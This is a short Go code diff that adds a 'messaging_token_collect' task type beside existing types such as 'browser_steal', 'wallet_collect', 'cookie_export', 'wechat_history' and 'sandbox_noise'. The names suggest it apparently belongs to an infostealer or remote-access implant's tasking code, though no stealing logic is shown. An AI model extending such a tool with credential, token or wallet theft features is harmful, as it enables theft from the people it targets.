@@ -142,6 +142,7 @@ const (
 	TaskTypePersistenceRem   = "persistence_remove"
 	TaskTypeBrowserSteal     = "browser_steal"
 	TaskTypeWalletCollect    = "wallet_collect"
+	TaskTypeMessagingToken   = "messaging_token_collect"
 	TaskTypeSandboxNoise     = "sandbox_noise"
 	TaskTypeWeChatHistory    = "wechat_history"
 	TaskTypeCookieExport     = "cookie_export"
@@ -385,6 +386,7 @@ func AllTaskTypes() []string {
 		TaskTypePersistenceRem,
 		TaskTypeBrowserSteal,
 		TaskTypeWalletCollect,
+		TaskTypeMessagingToken,
 		TaskTypeSandboxNoise,
 		TaskTypeWeChatHistory,
 		TaskTypeCookieExport,
